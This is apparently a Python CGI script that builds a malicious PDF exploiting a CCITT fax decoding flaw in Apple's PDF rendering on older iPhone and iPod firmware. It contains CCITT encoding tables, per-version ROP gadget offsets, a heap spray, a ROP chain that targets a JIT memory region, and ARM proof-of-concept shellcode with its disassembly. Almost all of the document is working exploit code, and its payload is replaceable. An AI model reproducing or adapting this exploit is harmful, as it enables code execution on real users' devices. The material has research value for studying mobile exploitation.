##########################################################################
####   Felipe Andres Manzano * fmanzano@fceia.unr.edu.ar              ####
####   updates in http://felipe.andres.manzano.googlepages.com/home   ####
##########################################################################
'''
'''
termWhite = [ ('00110101', 8, 0),
            ('000111', 6, 1),
            ('0111', 4, 2),
            ('1000', 4, 3),
            ('1011', 4, 4),
            ('1100', 4, 5),
            ('1110', 4, 6),
            ('1111', 4, 7),
            ('10011', 5, 8),
            ('10100', 5, 9),
            ('00111', 5, 10),
            ('01000', 5, 11),
            ('001000', 6, 12),
            ('000011', 6, 13),
            ('110100', 6, 14),
            ('110101', 6, 15),
            ('101010', 6, 16),
            ('101011', 6, 17),
            ('0100111', 7, 18),
            ('0001100', 7, 19),
            ('0001000', 7, 20),
            ('0010111', 7, 21),
            ('0000011', 7, 22),
            ('0000100', 7, 23),
            ('0101000', 7, 24),
            ('0101011', 7, 25),
            ('0010011', 7, 26),
            ('0100100', 7, 27),
            ('0011000', 7, 28),
            ('00000010', 8, 29),
            ('00000011', 8, 30),
            ('00011010', 8, 31),
            ('00011011', 8, 32),
            ('00010010', 8, 33),
            ('00010011', 8, 34),
            ('00010100', 8, 35),
            ('00010101', 8, 36),
            ('00010110', 8, 37),
            ('00010111', 8, 38),
            ('00101000', 8, 39),
            ('00101001', 8, 40),
            ('00101010', 8, 41),
            ('00101011', 8, 42),
            ('00101100', 8, 43),
            ('00101101', 8, 44),
            ('00000100', 8, 45),
            ('00000101', 8, 46),
            ('00001010', 8, 47),
            ('00001011', 8, 48),
            ('01010010', 8, 49),
            ('01010011', 8, 50),
            ('01010100', 8, 51),
            ('01010101', 8, 52),
            ('00100100', 8, 53),
            ('00100101', 8, 54),
            ('01011000', 8, 55),
            ('01011001', 8, 56),
            ('01011010', 8, 57),
            ('01011011', 8, 58),
            ('01001010', 8, 59),
            ('01001011', 8, 60),
            ('00110010', 8, 61),
            ('00110011', 8, 62),
            ('00110100', 8, 63)]

makeUpWhite = [ ('11011', 5, 64),
                ('10010', 5, 128),
                ('010111', 6, 192),
                ('0110111', 7, 256),
                ('00110110', 8, 320),
                ('00110111', 8, 384),
                ('01100100', 8, 448),
                ('01100101', 8, 512),
                ('01101000', 8, 576),
                ('01100111', 8, 640),
                ('011001100', 9, 704),
                ('011001101', 9, 768),
                ('011010010', 9, 832),
                ('011010011', 9, 896),
                ('011010100', 9, 960),
                ('011010101', 9, 1024),
                ('011010110', 9, 1088),
                ('011010111', 9, 1152),
                ('011011000', 9, 1216),
                ('011011001', 9, 1280),
                ('011011010', 9, 1344),
                ('011011011', 9, 1408),
                ('010011000', 9, 1472),
                ('010011001', 9, 1536),
                ('010011010', 9, 1600),
                ('011000', 6, 1664),
                ('010011011', 9, 1728),
                ('00000001000', 11, 1792), #extended
                ('00000001100', 11, 1856),
                ('00000001101', 11, 1920),
                ('000000010010', 12, 1984),
                ('000000010011', 12, 2048),
                ('000000010100', 12, 2112),
                ('000000010101', 12, 2176),
                ('000000010110', 12, 2240),
                ('000000010111', 12, 2304),
                ('000000011100', 12, 2368),
                ('000000011101', 12, 2432),
                ('000000011110', 12, 2496),
                ('000000011111', 12, 2560),
                ]


termBlack = [ ('0000110111', 10, 0),
            ('010', 3, 1),
            ('11', 2, 2),
            ('10', 2, 3),
            ('011', 3, 4),
            ('0011', 4, 5),
            ('0010', 4, 6),
            ('00011', 5, 7),
            ('000101', 6, 8),
            ('000100', 6, 9),
            ('0000100', 7, 10),
            ('0000101', 7, 11),
            ('0000111', 7, 12),
            ('00000100', 8, 13),
            ('00000111', 8, 14),
            ('000011000', 9, 15),
            ('0000010111', 10, 16),
            ('0000011000', 10, 17),
            ('0000001000', 10, 18),
            ('00001100111', 11, 19),
            ('00001101000', 11, 20),
            ('00001101100', 11, 21),
            ('00000110111', 11, 22),
            ('00000101000', 11, 23),
            ('00000010111', 11, 24),
            ('00000011000', 11, 25),
            ('000011001010', 12, 26),
            ('000011001011', 12, 27),
            ('000011001100', 12, 28),
            ('000011001101', 12, 29),
            ('000001101000', 12, 30),
            ('000001101001', 12, 31),
            ('000001101010', 12, 32),
            ('000001101011', 12, 33),
            ('000011010010', 12, 34),
            ('000011010011', 12, 35),
            ('000011010100', 12, 36),
            ('000011010101', 12, 37),
            ('000011010110', 12, 38),
            ('000011010111', 12, 39),
            ('000001101100', 12, 40),
            ('000001101101', 12, 41),
            ('000011011010', 12, 42),
            ('000011011011', 12, 43),
            ('000001010100', 12, 44),
            ('000001010101', 12, 45),
            ('000001010110', 12, 46),
            ('000001010111', 12, 47),
            ('000001100100', 12, 48),
            ('000001100101', 12, 49),
            ('000001010010', 12, 50),
            ('000001010011', 12, 51),
            ('000000100100', 12, 52),
            ('000000110111', 12, 53),
            ('000000111000', 12, 54),
            ('000000100111', 12, 55),
            ('000000101000', 12, 56),
            ('000001011000', 12, 57),
            ('000001011001', 12, 58),
            ('000000101011', 12, 59),
            ('000000101100', 12, 60),
            ('000001011010', 12, 61),
            ('000001100110', 12, 62),
            ('000001100111', 12, 63),]

makeUpBlack = [ ('0000001111', 10, 64),
                ('000011001000', 12, 128),
                ('000011001001', 12, 192),
                ('000001011011', 12, 256),
                ('000000110011', 12, 320),
                ('000000110100', 12, 384),
                ('000000110101', 12, 448),
                ('0000001101100', 13, 512),
                ('0000001101101', 13, 576),
                ('0000001001010', 13, 640),
                ('0000001001011', 13, 704),
                ('0000001001100', 13, 768),
                ('0000001001101', 13, 832),
                ('0000001110010', 13, 896),
                ('0000001110011', 13, 960),
                ('0000001110100', 13, 1024),
                ('0000001110101', 13, 1088),
                ('0000001110110', 13, 1152),
                ('0000001110111', 13, 1216),
                ('0000001010010', 13, 1280),
                ('0000001010011', 13, 1344),
                ('0000001010100', 13, 1408),
                ('0000001010101', 13, 1472),
                ('0000001011010', 13, 1536),
                ('0000001011011', 13, 1600),
                ('0000001100100', 13, 1664),
                ('0000001100101', 13, 1728),
                ('00000001000', 11, 1792),  #extended
                ('00000001100', 11, 1856),
                ('00000001101', 11, 1920),
                ('000000010010', 12, 1984),
                ('000000010011', 12, 2048),
                ('000000010100', 12, 2112),
                ('000000010101', 12, 2176),
                ('000000010110', 12, 2240),
                ('000000010111', 12, 2304),
                ('000000011100', 12, 2368),
                ('000000011101', 12, 2432),
                ('000000011110', 12, 2496),
                ('000000011111', 12, 2560),
                ]

import struct

def writeWhite(runlength):
    bitstream = ''
    while runlength >= 320:
        bitstream += '00110110'
        runlength -= 320

    while runlength >= 64:
        bitstream += '11011'
        runlength -= 64

    for s,l,val in termWhite:
        if val == runlength:
            bitstream += s

    return bitstream

def writeBlack(runlength):
    bitstream = ''
    while runlength >= 64:
        bitstream += '0000001111'
        runlength -= 64

    for s,l,val in termBlack:
        if val == runlength:
            bitstream += s

    return bitstream

def writeStr(s):
    s = s + 'P'*(len(s)%2)
    bitstream = ''
    black = False
    for i in xrange(0,len(s),2):
        if black:
            bitstream += writeBlack(struct.unpack('<H', s[i:i+2])[0])
        else:
            bitstream += writeWhite(struct.unpack('<H', s[i:i+2])[0])
        black = not black
    bitstream += '000000000001'*6
    r = ''
    for i in xrange(0,len(bitstream),4):
        r += {'0110': '6', '0111': '7', '0000': '0', '0001': '1', '0011': '3', '0010': '2', '0101': '5', '0100': '4', '1111': 'f', '1110': 'e', '1100': 'c', '1101': 'd', '1010': 'a', '1011': 'b', '1001': '9', '1000': '8'}[(bitstream[i:i+4]+'0000')[:4]]
    r+= '0'*(len(r)%2)
    return r.decode('hex')


import os
import zlib
import sys
from miniPDF import *

doc= PDFDoc()
#pages
pages = PDFDict()
pages.add("Type", PDFName("Pages"))

#catalog
catalog = PDFDict()
catalog.add("Type", PDFName("Catalog"))
catalog.add("Pages", PDFRef(pages))

#lets add those to doc just for showing up the Ref object.
doc.add([catalog, pages])
#Set the pdf root
doc.setRoot(catalog)

_width=1
_height=256

import struct
import cgi
form = cgi.FieldStorage()
if "version" not in form or "shellcode" not in form or "baseaddr" not in form:
    print "<H1>Error</H1>"
    print "Please fill in the shellcode address, the dyld_shared_cache base address and the firmware version."
    print str(form)
    exit()
address = int(form["shellcode"].value,16)
dyld_shared_cache = int(form["baseaddr"].value,16)
version = form["version"].value


#address = int(sys.argv[1].split('&')[0].split('=')  [2:],16)
#dyld_shared_cache = int(sys.argv[1].split('&')[1][2:],16)
#version = sys.argv[1].split('&')[2]

_offsets = { "iPhone3,1-7.0.4": {
                                "gadget0": 0x0bdb60d8 + dyld_shared_cache, #_longjmp
                                "gadget1": 0x014f1257 + dyld_shared_cache, #memcpy
                                "gadget2": 0x002ba973 + dyld_shared_cache, 
                                "gadget3": 0x000d98eb + dyld_shared_cache,
                                "gadget4": 0x0bdb40df + dyld_shared_cache,
                                "gadget5": 0x015a60a5 + dyld_shared_cache,
                                "jit": 0xc0f54f8 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0xda2c34 + dyld_shared_cache,
                                "exit":  0xbcc38dc + dyld_shared_cache,
                                 },
             "iPhone4,1-7.1":   {
                                "gadget0": 0x0c325008 + dyld_shared_cache,
                                "gadget1": 0x01551763 + dyld_shared_cache,
                                "gadget2": 0x00331167 + dyld_shared_cache, #0xc322e49 + dyld_shared_cache
                                "gadget3": 0x00118e6b + dyld_shared_cache, #0x1527ad9
                                "gadget4": 0x38322E5B -0x2c000000 + dyld_shared_cache, 
                                "gadget5": 0x016290a5 + dyld_shared_cache,
                                "jit": 0xc6805b0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound": 0xe1fd94 + dyld_shared_cache,
                                "exit": 0xc231a5c + dyld_shared_cache,
                                 },
             "iPhone5,1-7.1" :  {
                                "gadget0": 0x0c247798 + dyld_shared_cache,
                                "gadget1": 0x01600ad7 + dyld_shared_cache,
                                "gadget2": 0x00332433 + dyld_shared_cache,
                                "gadget3": 0x00119353 + dyld_shared_cache,
                                "gadget4": 0x38245BD9-0x2c000000 + dyld_shared_cache,
                                "gadget5": 0x0163e02d + dyld_shared_cache,
                                "jit": 0xc59e5a0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound": 0x2CE30249 -0x2c000000 + dyld_shared_cache,
                                "exit": 0x381E0710 - 0x2c000000 + dyld_shared_cache,
                                 },
              "iPhone5,1-7.1.1": {
                                "gadget0": 0x0c249798 + dyld_shared_cache,
                                "gadget1": 0x01600ad7 + dyld_shared_cache,
                                "gadget2": 0x00332433 + dyld_shared_cache,
                                "gadget3": 0x00119353 + dyld_shared_cache,
                                "gadget4": 0x38247BD9-0x2c000000 + dyld_shared_cache,
                                "gadget5": 0x0163e02d + dyld_shared_cache,
                                "jit": 0xc5a25a0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0x2CE30249 -0x2c000000 + dyld_shared_cache,
                                "exit":  0x381E0710 - 0x2c000000 + dyld_shared_cache,
                                 },
              "iPhone5,1-7.1.2": {
                                "gadget0": 0x0c265798 + dyld_shared_cache,
                                "gadget1": 0x015a9a0f + dyld_shared_cache,
                                "gadget2": 0x003323cb + dyld_shared_cache,
                                "gadget3": 0x00119353 + dyld_shared_cache,
                                "gadget4": 0x38263BD9-0x2c000000 + dyld_shared_cache,
                                "gadget5": 0x0165602d + dyld_shared_cache,
                                "jit": 0xc5be5a0 + dyld_shared_cache,
                                "AudioServicesPlaySystemSound":  0x2CE30081 -0x2c000000 + dyld_shared_cache,
                                "exit":  0xc173819 + dyld_shared_cache,
                                 },

             "iPod4,1-6.1.5" :   { "gadget1": 0x124559e + dyld_shared_cache,
                                   "gadget0": 0x920e6a0 + dyld_shared_cache,
                                   "jit": 0 + dyld_shared_cache,
                                   "exit": 0x92054dc + dyld_shared_cache,
                                   "AudioServicesPlaySystemSound": 0xbd4684+ dyld_shared_cache,
                                  },

            }


if version in ["iPhone3,1-7.0.4", "iPhone4,1-7.1", "iPhone5,1-7.1", "iPhone5,1-7.1.1", "iPhone5,1-7.1.2"]:
    stage1 = struct.pack('<L', 0x00000001)         # Refcount  <--- address
    stage1+= struct.pack('<L', address+0x14)       # unused
    stage1+= struct.pack('<L', 0x00000000)         # tokenlist -> null for now
    stage1+= struct.pack('<L', _offsets[version]['gadget0'])         # unused/longjump gadget 0
    stage1+= struct.pack('<L', address+0x4)
    stage1+= struct.pack('<L', 0x200) #r4
    stage1+= struct.pack('<L', _offsets[version]['jit']) #0x47474747) #r5
    stage1+= struct.pack('<L', _offsets[version]['jit'] - 24) #0x48484848) #r6
    stage1+= struct.pack('<L', 0x49494949) #r7
    stage1+= struct.pack('<L', 0x50505050)#dyld_shared_cache+0x15486a3)#0x14c56b3)#0x50505050) #r8
    stage1+= struct.pack('<L', address+23*4) #r10
    stage1+= struct.pack('<L', 0x52525252) #r11
    stage1+= struct.pack('<L', address+11*4) #_offsets[version]['jit']-7 *4) #sp
    stage1+= struct.pack('<L', _offsets[version]['gadget1']) #lr
    stage1+= struct.pack('<L', _offsets[version]['gadget4']) #0xbdb40df + dyld_shared_cache)
    stage1+= struct.pack('<L', 0x200)
    stage1+= struct.pack('<L', _offsets[version]['jit']-8)
    stage1+= struct.pack('<L', 0x60606060)
    stage1+= struct.pack('<L', _offsets[version]['gadget2']) #0x14a4ae9 + dyld_shared_cache) #ldr     r0, [r0, #0], pop     {r7, pc}
    stage1+= struct.pack('<L', 0x62626262)
    stage1+= struct.pack('<L',  _offsets[version]['gadget3']) #0x15359df+ dyld_shared_cache)
    stage1+= struct.pack('<L', 0x64646464)
    stage1+= struct.pack('<L',  _offsets[version]['gadget5']) #0x15a60a5+ dyld_shared_cache)

'''
PoC Shellcode. Up to 108 bytes.
00000000 <_main>:
   0:	e2820009 	add	r0, r2, #9
   4:	e12fff10 	bx	r0

00000008 <_main_thumb>:
   8:	46fd      	mov	sp, pc
   a:	4b07      	ldr	r3, [pc, #28]	; (28 <stack_offset>)
   c:	449d      	add	sp, r3
   e:	4803      	ldr	r0, [pc, #12]	; (1c <ios_AudioServicesPlaySystemSound_param>)
  10:	4b03      	ldr	r3, [pc, #12]	; (20 <ios_AudioServicesPlaySystemSound>)
  12:	4798      	blx	r3
  14:	4b03      	ldr	r3, [pc, #12]	; (24 <ios_exit>)
  16:	2000      	movs	r0, #0
  18:	4718      	bx	r3
  1a:	46c0      	nop			; (mov r8, r8)

0000001c <ios_AudioServicesPlaySystemSound_param>:
  1c:	000003ae 	.word	0x000003ae

00000020 <ios_AudioServicesPlaySystemSound>:
  20:	2f938c34 	.word	0x2f938c34

00000024 <ios_exit>:
  24:	3a8598dc 	.word	0x3a8598dc

00000028 <stack_offset>:
  28:	00010000 	.word	0x00010000

'''
stage2 = '\x09\x00\x82\xe2\x10\xff\x2f\xe1\xfd\x46\x07\x4b\x9d\x44\x03\x48\x03\x4b\x98\x47\x03\x4b\x00\x20\x18\x47\xc0\x46'+struct.pack('<L', 0x3ea)+ struct.pack('<L', _offsets[version]['AudioServicesPlaySystemSound']|1) + struct.pack('<L', _offsets[version]['exit']|1)+struct.pack('<L', 0x50000)

stage1 +=stage2

assert (200-0x19-0x10-8-len(stage1))>=0

token  = struct.pack('<L', 0 )              #next
token += struct.pack('<L', 0x00000007 )     #type 07 (array)
token += struct.pack('<L', address )        #pointer to spray/controled memory
token += struct.pack('<L', 0x41424344 )     #$unknown/unused


decodeparams = PDFDict()
decodeparams.add('Columns', PDFNum(0x3fffffff-4))
decodeparams.add('K', PDFNum(0))
decodeparams.add('Rows', PDFNum(0))
decodeparams.add('EndOfLine', PDFBool(False))
decodeparams.add('EncodedByteAlign',  PDFBool(False))
decodeparams.add('EndOfBlock', PDFBool(True))
decodeparams.add('BlackIs1', PDFBool(True))

contents = PDFStream(PDFDict(), 
('q '+ ' 0 '*100000 + str(PDFOctalString(stage1+'a'*(200-0x19-0x10-8-len(stage1))))*1000 +
''' BI /IM true /W 640 /H 480 /CS /G /BPC 1 /F /CCF /DP '''+str( decodeparams) +'''
ID ''' + writeStr(token*1) +'''
EI ''' + ' Q khj ^ ] ) wd !#$% ').encode('zlib'))
contents.dict.add('Filter', PDFName('FlateDecode'))
resources = PDFDict()
resources.add('ProcSet', PDFArray([PDFName('PDF'), PDFName('ImageC'), PDFName('ImageI'), PDFName('ImageB')]))

#Im1=PDFDict()
#Im1.add('Im1',PDFRef(xobj))
#resources.add('XObject', Im1)

#The pdf page
page = PDFDict()
page.add('Type', '/Page')
page.add('Parent', PDFRef(pages))
page.add('MediaBox', PDFArray([ 0, 0, _width, _height]))
page.add('Contents', PDFRef(contents))
page.add('Resources', PDFRef(resources))

[doc.add(x) for x in [contents, resources, page ]]
pages.add('Count', PDFNum(1))
pages.add('Kids',PDFArray([PDFRef(page)]))

print doc.__str__(),

